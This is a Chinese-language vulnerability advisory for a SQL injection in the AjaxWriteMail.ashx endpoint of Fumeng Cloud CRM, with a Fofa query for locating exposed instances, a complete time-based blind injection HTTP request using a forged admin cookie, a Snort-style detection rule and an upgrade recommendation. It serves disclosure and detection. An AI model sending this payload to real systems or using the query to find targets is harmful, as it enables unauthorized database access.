# 孚盟云CRM AjaxWriteMail.ashx 存在SQL注入漏洞

孚盟云CRM AjaxWriteMail.ashx 存在SQL注入漏洞

# 影响版本

**孚盟云**（官方未公布具体版本号）

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **app=&quot;孚盟软件-孚盟云&quot;**

**POC/EXP：**

**step1** **延时注入测试**

```
POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UserCookie={"empId":"admin","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=updateLastedContactTable&mails=1'WAITFOR+DELAY+'0:0:5'--
```

​![image](assets/image-20260901145920-p44n9lb.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"孚盟云CRM - /m/Dingding/Ajax/AjexWriteMail.ashx SQL注入漏洞 (Time-based Blind)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/m/Dingding/Ajax/AjaxWriteMail.ashx"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"mails="; nocase;
    http.request_body; pcre:"/WAITFOR\s*DELAY|WAITFOR\+DELAY/i";
    metadata:
        service http,
        affected_product "孚盟云CRM",
        vulnerability_type "SQL Injection (Time-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000746;
    rev:1;
    priority:1;
)
```

# 漏洞修复

**尽快升级**：官方已发布安全补丁。

‍
